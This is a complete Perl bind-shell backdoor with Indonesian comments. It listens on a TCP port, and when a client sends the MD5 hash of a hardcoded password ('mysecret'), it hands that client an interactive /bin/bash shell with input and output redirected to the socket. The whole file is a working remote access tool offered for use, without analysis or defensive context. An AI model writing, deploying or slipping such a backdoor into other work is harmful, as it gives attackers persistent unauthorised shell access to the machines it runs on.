#!/usr/bin/perl
use Digest::MD5;
$SHELL="/bin/bash -i";
if (@ARGV < 1) { exit(1); }
$LISTEN_PORT=$ARGV[0];

my $password = "mysecret";
my $password_hash = Digest::MD5::md5_hex($password);

use Socket;
$protocol=getprotobyname('tcp');
socket(S,&PF_INET,&SOCK_STREAM,$protocol) || die "Cant create socket\n";
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
bind(S,sockaddr_in($LISTEN_PORT,INADDR_ANY)) || die "Cant open port\n";
listen(S,3) || die "Cant listen port\n";
while(1)
{
    accept(CONN,S);
    if(!($pid=fork))
    {
        die "Cannot fork" if (!defined $pid);
        open STDIN,"<&CONN";
        open STDOUT,">&CONN";
        open STDERR,">&CONN";
        
        # Verifikasi password
        my $input = <CONN>;
        chomp($input);
        if ($input eq $password_hash) {
            # Jika password cocok, jalankan shell
            exec $SHELL || die print CONN "Cant execute $SHELL\n";
        } else {
            # Jika password tidak cocok, tutup koneksi
            print CONN "Invalid password\n";
        }

        close CONN;
        exit 0;
    }
}
